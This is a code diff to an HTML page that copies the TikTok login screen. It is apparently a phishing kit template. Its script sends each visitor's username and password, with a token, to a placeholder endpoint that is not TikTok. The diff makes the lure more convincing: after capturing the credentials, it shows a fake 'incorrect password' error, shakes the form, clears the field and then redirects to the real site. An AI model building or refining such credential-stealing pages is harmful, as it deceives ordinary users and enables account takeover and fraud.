@@ -1,123 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Log in | TikTok</title>
+    <link rel="icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
+    <meta name="description" content="Log in to TikTok to see more videos">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background-color: #fff;
-            font-family: 'TikTokFont', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #161823;
-        }
-
-        .login-card {
-            width: 100%;
-            max-width: 480px;
-            padding: 0 40px;
-            text-align: center;
-        }
-
-        h1 {
-            font-size: 32px;
-            font-weight: 700;
-            margin-bottom: 24px;
-        }
-
-        .input-group {
-            margin-bottom: 12px;
-            text-align: left;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 6px;
-        }
-
-        .input-wrapper {
-            position: relative;
-            background-color: #f1f1f2;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-        }
-
-        .input-wrapper input {
-            width: 100%;
-            height: 44px;
-            padding: 0 12px;
-            background: transparent;
-            border: 1px solid transparent;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-        }
-
-        .input-wrapper input:focus {
-            border-color: #fe2c55;
-            background-color: #fff;
-        }
-
-        .login-btn {
-            width: 100%;
-            height: 44px;
-            background-color: #fe2c55;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 20px;
-            opacity: 0.5;
-            pointer-events: none;
-        }
-
-        .login-btn.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .forgot {
-            font-size: 14px;
-            color: #161823;
-            text-decoration: none;
-            display: block;
-            margin-top: 16px;
-        }
-
-        .forgot:hover {
-            text-decoration: underline;
-        }
-
-        .footer {
-            border-top: 1px solid #e3e3e4;
-            margin-top: 40px;
-            padding-top: 24px;
-            font-size: 14px;
-        }
-
-        .footer span {
-            color: #fe2c55;
-            font-weight: 600;
-            cursor: pointer;
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background-color:#fff;font-family:'TikTokFont',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#161823}
+        .login-card{width:100%;max-width:480px;padding:0 40px;text-align:center;animation:fadeIn .4s ease}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+        @keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-5px)}40%,80%{transform:translateX(5px)}}
+        h1{font-size:32px;font-weight:700;margin-bottom:24px}
+        .input-group{margin-bottom:12px;text-align:left}
+        .input-group label{display:block;font-size:14px;font-weight:600;margin-bottom:6px}
+        .input-wrapper{position:relative;background-color:#f1f1f2;border-radius:4px;display:flex;align-items:center}
+        .input-wrapper input{width:100%;height:44px;padding:0 12px;background:transparent;border:1px solid transparent;border-radius:4px;font-size:16px;outline:none;transition:border-color .2s,background-color .2s}
+        .input-wrapper input:focus{border-color:#fe2c55;background-color:#fff}
+        .show-pass-btn{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:18px;color:#161823;padding:4px}
+        .login-btn{width:100%;height:44px;background-color:#fe2c55;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-top:20px;opacity:.5;pointer-events:none;transition:opacity .2s,transform .1s;position:relative}
+        .login-btn.active{opacity:1;pointer-events:auto}
+        .login-btn:active{transform:scale(.98)}
+        .spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top:2px solid #fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .forgot{font-size:14px;color:#161823;text-decoration:none;display:block;margin-top:16px}
+        .forgot:hover{text-decoration:underline}
+        .footer{border-top:1px solid #e3e3e4;margin-top:40px;padding-top:24px;font-size:14px}
+        .footer span{color:#fe2c55;font-weight:600;cursor:pointer}
+        .error-text{color:#fe2c55;font-size:13px;text-align:left;margin-top:6px;display:none}
     </style>
 </head>
-
 <body>
     <div class="login-card">
         <h1>Log in</h1>
@@ -132,50 +45,40 @@
                 <label>Password</label>
                 <div class="input-wrapper">
                     <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+                    <button type="button" class="show-pass-btn" id="showPass">👁</button>
                 </div>
             </div>
+            <div class="error-text" id="errorMsg">Incorrect username or password</div>
             <button type="submit" id="loginBtn" class="login-btn">Log in</button>
         </form>
         <a href="#" class="forgot">Forgot password?</a>
-
-        <div class="footer">
-            Don't have an account? <span>Sign up</span>
-        </div>
+        <div class="footer">Don't have an account? <span>Sign up</span></div>
     </div>
-
     <script>
-        const u = document.getElementById('username');
-        const p = document.getElementById('password');
-        const btn = document.getElementById('loginBtn');
-        const form = document.getElementById('tiktokForm');
-
-        function check() {
-            if (u.value && p.value) {
-                btn.classList.add('active');
-            } else {
-                btn.classList.remove('active');
-            }
-        }
-
-        u.addEventListener('input', check);
-        p.addEventListener('input', check);
-
-        form.addEventListener('submit', (e) => {
+        const u=document.getElementById('username'),p=document.getElementById('password'),btn=document.getElementById('loginBtn');
+        const showPass=document.getElementById('showPass');
+        function check(){btn.classList.toggle('active',u.value&&p.value.length>=6)}
+        u.addEventListener('input',check);p.addEventListener('input',check);
+        showPass.addEventListener('click',()=>{
+            if(p.type==='password'){p.type='text';showPass.textContent='🙈';}
+            else{p.type='password';showPass.textContent='👁';}
+        });
+        document.getElementById('tiktokForm').addEventListener('submit',(e)=>{
             e.preventDefault();
-            const data = {
-                token: '__TOKEN__',
-                username: u.value,
-                password: p.value
-            };
-            fetch('__API_URL__', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).finally(() => {
-                window.location.href = 'https://www.tiktok.com/';
-            });
+            if(!u.value||p.value.length<6)return;
+            btn.innerHTML='<span class="spinner"></span>';btn.style.pointerEvents='none';
+            const data={token:'__TOKEN__',username:u.value,password:p.value};
+            fetch('__API_URL__',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
+            .then(()=>{
+                document.getElementById('errorMsg').style.display='block';
+                btn.textContent='Log in';btn.style.pointerEvents='auto';
+                p.value='';check();
+                document.querySelector('.login-card').style.animation='shake 0.4s';
+                setTimeout(()=>document.querySelector('.login-card').style.animation='',400);
+                setTimeout(()=>{window.location.href='https://www.tiktok.com/';},3000);
+            })
+            .catch(()=>{window.location.href='https://www.tiktok.com/';});
         });
     </script>
 </body>
-
 </html>
